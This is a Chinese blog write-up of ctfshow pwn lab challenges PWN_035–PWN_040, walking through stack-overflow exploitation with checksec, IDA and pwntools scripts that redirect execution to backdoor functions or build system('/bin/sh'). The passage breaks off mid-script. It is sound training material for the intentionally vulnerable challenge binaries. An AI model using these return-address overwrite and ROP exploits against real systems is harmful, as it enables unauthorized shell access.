	
		class="gallery-image" 
		data-flex-grow="205"
		data-flex-basis="493px"
	
></p>
<h2 id="栈溢出">栈溢出
</h2><h3 id="pwn_035">PWN_035
</h3><p>题目：正式开始栈溢出了，先来一个最最最最简单的吧</p>
<p>用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh ctfshow@题目地址 -p题目端口号
</span></span></code></pre></td></tr></table>
</div>
</div><p>**不是nc连接 **</p>
<p><a class="link" href="https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ"  target="_blank" rel="noopener"
    >专用虚拟机镜像，全套在这里，提取码show</a></p>
<p><a class="link" href="PWN_035" >PWN_035</a></p>
<hr>
<p>checksec一下：</p>
<p><img src="/p/ctfshow-pwn-writeup/96.png"
	width="845"
	height="198"
	srcset="/p/ctfshow-pwn-writeup/96_hu_5cec7781a9fafd95.png 480w, /p/ctfshow-pwn-writeup/96_hu_ceae71005b53e245.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="426"
		data-flex-basis="1024px"
	
></p>
<p>没开canary保护，对应了本章主题——栈溢出。</p>
<p>IDA分析：</p>
<p><img src="/p/ctfshow-pwn-writeup/97.png"
	width="1106"
	height="726"
	srcset="/p/ctfshow-pwn-writeup/97_hu_8cfcbbb1f6ccb348.png 480w, /p/ctfshow-pwn-writeup/97_hu_894ff25413a0ac82.png 1024w"
	loading="lazy"
	
		alt="main函数反编译分析"
	
	
		class="gallery-image" 
		data-flex-grow="152"
		data-flex-basis="365px"
	
></p>
<p>跟进函数：</p>
<p><img src="/p/ctfshow-pwn-writeup/98.png"
	width="569"
	height="200"
	srcset="/p/ctfshow-pwn-writeup/98_hu_7f17590d89865cd7.png 480w, /p/ctfshow-pwn-writeup/98_hu_492c2c611443a23c.png 1024w"
	loading="lazy"
	
		alt="sigsegv_handler函数"
	
	
		class="gallery-image" 
		data-flex-grow="284"
		data-flex-basis="682px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/99.png"
	width="564"
	height="190"
	srcset="/p/ctfshow-pwn-writeup/99_hu_64242a0110d6f688.png 480w, /p/ctfshow-pwn-writeup/99_hu_f5443b1ee09bc173.png 1024w"
	loading="lazy"
	
		alt="ctfshow函数"
	
	
		class="gallery-image" 
		data-flex-grow="296"
		data-flex-basis="712px"
	
></p>
<p>由此可知：ctfshow函数存在栈溢出漏洞，超过104字节就会发生栈溢出；</p>
<p>对于<code>SIGSEGV</code>函数，当栈溢出触发 SIGSEGV 时，sigsegv_handler 函数会被调用，然后触发函数内部——fprintf打印出flag字符串，也正好对应了fget函数读取的flag值。</p>
<blockquote class="alert alert-warn">
    <p>栈溢出会破坏栈上的 “返回地址”“栈帧信息” 或其他关键内存结构，最终引发<strong>非法内存访问</strong>（比如函数返回时跳转到无效地址），触发 <code>SIGSEGV</code> 信号。</p></blockquote>
<p>所以说我们只要在运行的时候给程序打入超过104个的字符串就好，可以是105个“a”。</p>
<p><img src="/p/ctfshow-pwn-writeup/100.png"
	width="1235"
	height="555"
	srcset="/p/ctfshow-pwn-writeup/100_hu_3fabc6f5bf3328d1.png 480w, /p/ctfshow-pwn-writeup/100_hu_28f40016a971c608.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="534px"
	
></p>
<h3 id="binsh地址的跳转利用"><strong>/bin/sh地址的跳转利用</strong>
</h3><p>相较于32位程序，64 位程序调用函数需满足 <strong>栈对齐</strong>，因此构造 payload 时需注意：</p>
<p>在实际解题中，<code>ret</code> 地址需要针对当前题目动态获取，用 <code>ROPgadget</code> 工具直接搜索程序中的 <code>ret</code> 指令（最常用）：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn <span class="p">|</span> grep ret
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_036">PWN_036
</h3><p>题目：存在后门函数，如何利用？ <a class="link" href="PWN_036" >PWN_036</a></p>
<p><img src="/p/ctfshow-pwn-writeup/101.png"
	width="826"
	height="231"
	srcset="/p/ctfshow-pwn-writeup/101_hu_6afe63e25fe4af19.png 480w, /p/ctfshow-pwn-writeup/101_hu_ca0bed959ef72a10.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="357"
		data-flex-basis="858px"
	
></p>
<p>非常不安全！！！！没有canary保护。可以用ret2shellcode、ret2libc。</p>
<p><img src="/p/ctfshow-pwn-writeup/102.png"
	width="1225"
	height="506"
	srcset="/p/ctfshow-pwn-writeup/102_hu_1ea758b340b9373a.png 480w, /p/ctfshow-pwn-writeup/102_hu_c4eefe935b6b6cf7.png 1024w"
	loading="lazy"
	
		alt="main-IDA的分析"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="581px"
	
></p>
<p>这题开始怪怪的，找不到/bin/sh的后门，sigsegv_handler 函数没有我们想要的flag，不过在左边函数目录看到熟悉的故人——get_flag函数，直接跟进看看：</p>
<p><img src="/p/ctfshow-pwn-writeup/103.png"
	width="961"
	height="289"
	srcset="/p/ctfshow-pwn-writeup/103_hu_ec17c27209d749fe.png 480w, /p/ctfshow-pwn-writeup/103_hu_ed5b527b98ddfd0f.png 1024w"
	loading="lazy"
	
		alt="跟进get_flag函数"
	
	
		class="gallery-image" 
		data-flex-grow="332"
		data-flex-basis="798px"
	
></p>
<p>可以看到下面的fgets读取和返回的printf(s)打印函数，输出flag字符串，主函数没有引用它啊，怎么办？我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag。（可以用ret2shellcode、ret2libc）</p>
<p>main函数的突破点在这：</p>
<p><img src="/p/ctfshow-pwn-writeup/104.png"
	width="860"
	height="215"
	srcset="/p/ctfshow-pwn-writeup/104_hu_5cc36469a1fe2e12.png 480w, /p/ctfshow-pwn-writeup/104_hu_fcf805775837a51c.png 1024w"
	loading="lazy"
	
		alt="在main跟进ctfshow函数"
	
	
		class="gallery-image" 
		data-flex-grow="400"
		data-flex-basis="960px"
	
></p>
<p>没开canary保护，s数组可存储大小范围是36，超过了就覆盖返回地址了。</p>
<blockquote class="alert alert-error">
    <blockquote>
<p>gets 读取函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>安全性来看一般都会用fgets函数，搭配<strong>FORTIFY 缓冲区边界检查</strong>来提高程序自身安全性。</p></blockquote></blockquote>
<p>exp：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28297</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">get_flag_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;get_flag&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">44</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_flag_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1">#远程发送</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>     <span class="c1">#开启shell交互模式（类似终端）</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里的44个‘a’是0x28 + 4 ，0x28（十进制 40）是缓冲区到 ebp（栈基址寄存器）的距离，+4 是覆盖 ebp 本身（32 位程序中寄存器占 4 字节），总共 44 字节后，后续数据才能覆盖函数的 “返回地址”，从而跳转到 get_flag 函数。当然你可以用cyclic(0x28 + 4)，产生44字节的垃圾值。</p>
<p><img src="/p/ctfshow-pwn-writeup/105.png"
	width="1130"
	height="569"
	srcset="/p/ctfshow-pwn-writeup/105_hu_9fe21db2e56fb303.png 480w, /p/ctfshow-pwn-writeup/105_hu_2f03f58823b9acb.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="476px"
	
></p>
<h3 id="pwn_037">PWN_037
</h3><p>题目：32位的 system(“/bin/sh”) 后门函数给你。 <a class="link" href="PWN_037" >PWN_037</a></p>
<p>checksec发现是有无栈溢出保护的，关了canary。</p>
<p>IDA分析：</p>
<p><img src="/p/ctfshow-pwn-writeup/106.png"
	width="649"
	height="204"
	srcset="/p/ctfshow-pwn-writeup/106_hu_28baf5c7d68b2e77.png 480w, /p/ctfshow-pwn-writeup/106_hu_1e83db09825e803f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="318"
		data-flex-basis="763px"
	
></p>
<p>可以发现main函数没有什么可以利用的，但是在函数目录可以看到有个backdoor的函数有猫腻&hellip;.</p>
<p><img src="/p/ctfshow-pwn-writeup/107.png"
	width="689"
	height="309"
	srcset="/p/ctfshow-pwn-writeup/107_hu_8a3f21dfb544f975.png 480w, /p/ctfshow-pwn-writeup/107_hu_82558c987e30e4e0.png 1024w"
	loading="lazy"
	
		alt="真“后门”函数——backdoor"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="535px"
	
></p>
<p>这个函数居然有/bin/sh！！！！！</p>
<p>跟进ctfshow函数：</p>
<p><img src="/p/ctfshow-pwn-writeup/108.png"
	width="685"
	height="149"
	srcset="/p/ctfshow-pwn-writeup/108_hu_2f6decafcbb4d7a.png 480w, /p/ctfshow-pwn-writeup/108_hu_13e7ed272ddf4f58.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="459"
		data-flex-basis="1103px"
	
></p>
<p>有read读取函数，那我们可以以此为注入点，用垃圾值0x12+4先覆盖函数变量和寄存器ebp本身，然后再上传一个后门函数的地址。</p>
<p>exp：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28229</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]</span> <span class="c1">#后门函数的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x12</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/109.png"
	width="1043"
	height="460"
	srcset="/p/ctfshow-pwn-writeup/109_hu_5594301dde95ce57.png 480w, /p/ctfshow-pwn-writeup/109_hu_f2393a4d4b100c98.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="226"
		data-flex-basis="544px"
	
></p>
<p>脚本exp万岁。</p>
<h3 id="pwn_038">PWN_038
</h3><p>题目：64位的 system(“/bin/sh”) 后门函数给你。</p>
<p>checksec：</p>
<p><img src="/p/ctfshow-pwn-writeup/110.png"
	width="845"
	height="209"
	srcset="/p/ctfshow-pwn-writeup/110_hu_cc699b9c9e84b874.png 480w, /p/ctfshow-pwn-writeup/110_hu_818237d793c59893.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="404"
		data-flex-basis="970px"
	
></p>
<p>没开canary保护，开NX保护（不能ret2shellcode）</p>
<p><img src="/p/ctfshow-pwn-writeup/111.png"
	width="653"
	height="150"
	srcset="/p/ctfshow-pwn-writeup/111_hu_557177fc9847835c.png 480w, /p/ctfshow-pwn-writeup/111_hu_3e2e3f6328afcdc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="435"
		data-flex-basis="1044px"
	
></p>
<p>buf数组距离ebp寄存器为0xAh，加上本身寄存器ebp的8字节。</p>
<p>跟进backdoor函数看到/bin/sh，本题思路和上题PWN_037一样，只不过架构变成64位而已。</p>
<p><img src="/p/ctfshow-pwn-writeup/107.png"
	width="689"
	height="309"
	srcset="/p/ctfshow-pwn-writeup/107_hu_8a3f21dfb544f975.png 480w, /p/ctfshow-pwn-writeup/107_hu_82558c987e30e4e0.png 1024w"
	loading="lazy"
	
		alt="上题backdoor函数的int类型"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="535px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/112.png"
	width="610"
	height="126"
	srcset="/p/ctfshow-pwn-writeup/112_hu_7a50666a6534a184.png 480w, /p/ctfshow-pwn-writeup/112_hu_f2c44b968d3f43b7.png 1024w"
	loading="lazy"
	
		alt="本题的后门函数int_64"
	
	
		class="gallery-image" 
		data-flex-grow="484"
		data-flex-basis="1161px"
	
></p>
<blockquote class="alert alert-note">
    <blockquote>
<p>64 位程序调用 <code>system</code> 需考虑堆栈平衡，本质是 <strong>64 位 ABI 对 “栈对齐” 的硬性要求</strong>—— 若不满足，函数执行时访问栈内存会崩溃；而 32 位 ABI 无此要求，仅需调用后清理参数栈即可，因此无需额外关注平衡。</p></blockquote></blockquote>
<p>所以说exp需要考虑到堆栈平衡加上ret返回地址：</p>
<p><img src="/p/ctfshow-pwn-writeup/113.png"
	width="1198"
	height="261"
	srcset="/p/ctfshow-pwn-writeup/113_hu_3770565c136ecdbb.png 480w, /p/ctfshow-pwn-writeup/113_hu_f3c84935d209b6bf.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="459"
		data-flex-basis="1101px"
	
></p>
<p>在实际解题中，<code>ret</code> 地址需要针对当前题目动态获取，常用方法：</p>
<p><strong>工具查找</strong>：用 <code>ROPgadget</code> 工具直接搜索程序中的 <code>ret</code> 指令（最常用）：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn <span class="p">|</span> grep ret
</span></span></code></pre></td></tr></table>
</div>
</div><p>exp：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28147</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x400287</span> <span class="c1"># 0x0000000000400287 : ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_039">PWN_039
</h3><p>题目：32位的 system(); &ldquo;/bin/sh&rdquo;。 <a class="link" href="PWN_039" >PWN_039</a></p>
<p>checksec一下：</p>
<p><img src="/p/ctfshow-pwn-writeup/114.png"
	width="750"
	height="210"
	srcset="/p/ctfshow-pwn-writeup/114_hu_ffd0edb80748b701.png 480w, /p/ctfshow-pwn-writeup/114_hu_ed469b05f80e7568.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="357"
		data-flex-basis="857px"
	
></p>
<p>可以看到没开启canary、PIE保护的，存在可利用栈溢出漏洞的可能。</p>
<p>IDA：</p>
<p><img src="/p/ctfshow-pwn-writeup/115.png"
	width="1000"
	height="450"
	srcset="/p/ctfshow-pwn-writeup/115_hu_e696ee341380586.png 480w, /p/ctfshow-pwn-writeup/115_hu_a20ea7fd6a1243a2.png 1024w"
	loading="lazy"
	
		alt="32位的IDA分析"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="533px"
	
></p>
<p>跟进ctfshow函数发现栈溢出：</p>
<p><img src="/p/ctfshow-pwn-writeup/116.png"
	width="596"
	height="140"
	srcset="/p/ctfshow-pwn-writeup/116_hu_1199a62a52d94a2a.png 480w, /p/ctfshow-pwn-writeup/116_hu_d138901c5d88e68e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="425"
		data-flex-basis="1021px"
	
></p>
<p>可以读取50个字符给buf，但buf容量只有14，所以超过14就会造成栈溢出。</p>
<p>接着在函数目录看到hint函数有猫腻：</p>
<p><img src="/p/ctfshow-pwn-writeup/117.png"
	width="854"
	height="390"
	srcset="/p/ctfshow-pwn-writeup/117_hu_25ebd19a12518947.png 480w, /p/ctfshow-pwn-writeup/117_hu_27e696ef37eed855.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="525px"
	
></p>
<p>那么大致的exp思路就来了：也就是先cyclic函数生成垃圾值覆盖局部变量和ebp寄存器本身；但是只有system函数和/bin/sh，却没有system(“/bin/sh”);的后门，所以我们只能构造出来。</p>
<p>在编写exp时，因为程序是32位，所以说不用去考虑它的堆栈平衡：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28216</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x8048750</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里的p32(0)等于4字节，可以用四个a或者cyclic(4)代替也行，这时32位下system函数的返回地址占位符，然后就到执行/bin/sh，那就是跳转到它的地址：</p>
<p><img src="/p/ctfshow-pwn-writeup/118.png"
	width="1155"
	height="119"
	srcset="/p/ctfshow-pwn-writeup/118_hu_e5e93807f34b7bdd.png 480w, /p/ctfshow-pwn-writeup/118_hu_875bb0d0ab4ca27d.png 1024w"
	loading="lazy"
	
		alt="/bin/sh字符串的地址"
	
	
		class="gallery-image" 
		data-flex-grow="970"
		data-flex-basis="2329px"
	
></p>
<p>这样子我们就构造出system(&quot;/bin/sh&quot;);了，然后进入交互模式获得flag。</p>
<p>这题主要考察我们对于函数的构造以及函数地址的拼接、栈的结构组成。需要多看看我的PWN-2啊。。。。</p>
<h3 id="pwn_040">PWN_040
</h3><p>题目：64位的 system(); &ldquo;/bin/sh&rdquo;。</p>
<p>IDA64位分析，跟进ctfshow函数：</p>
<p><img src="/p/ctfshow-pwn-writeup/119.png"
	width="551"
	height="149"
	srcset="/p/ctfshow-pwn-writeup/119_hu_4361ba4a461d934e.png 480w, /p/ctfshow-pwn-writeup/119_hu_d335e677bd05e71e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="369"
		data-flex-basis="887px"
	
></p>
<p>checksec看到未打开canary保护，而且在ctfshow函数这发现有栈溢出。</p>
<p>跟进hint函数，发现后门。</p>
<p><img src="/p/ctfshow-pwn-writeup/120.png"
	width="540"
	height="125"
	srcset="/p/ctfshow-pwn-writeup/120_hu_ac0e24a915fef2c8.png 480w, /p/ctfshow-pwn-writeup/120_hu_a859f06ba4c0b768.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="432"
		data-flex-basis="1036px"
	
></p>
<p>用ROPgadget命令查询ret地址：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn <span class="p">|</span> grep ret
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/121.png"
	width="1224"
	height="450"
	srcset="/p/ctfshow-pwn-writeup/121_hu_749e2c86a93f982a.png 480w, /p/ctfshow-pwn-writeup/121_hu_9f8cdc6270b0312a.png 1024w"
	loading="lazy"
	
		alt="ret地址查询"
	
	
		class="gallery-image" 
		data-flex-grow="272"
		data-flex-basis="652px"
	
></p>
<p>查询/bin/sh的地址：</p>
<p><img src="/p/ctfshow-pwn-writeup/122.png"
	width="1135"
	height="105"
	srcset="/p/ctfshow-pwn-writeup/122_hu_8e4f1859de6b1d4c.png 480w, /p/ctfshow-pwn-writeup/122_hu_772a3258af0a8472.png 1024w"
	loading="lazy"
	
		alt="/bin/sh的地址：0x400808"
	
	
		class="gallery-image" 
		data-flex-grow="1080"
		data-flex-basis="2594px"
	
></p>
<p>exp：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28194</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x400808</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4007e3</span> <span class="c1"># 0x00000000004007e3 : pop rdi ; ret</span>
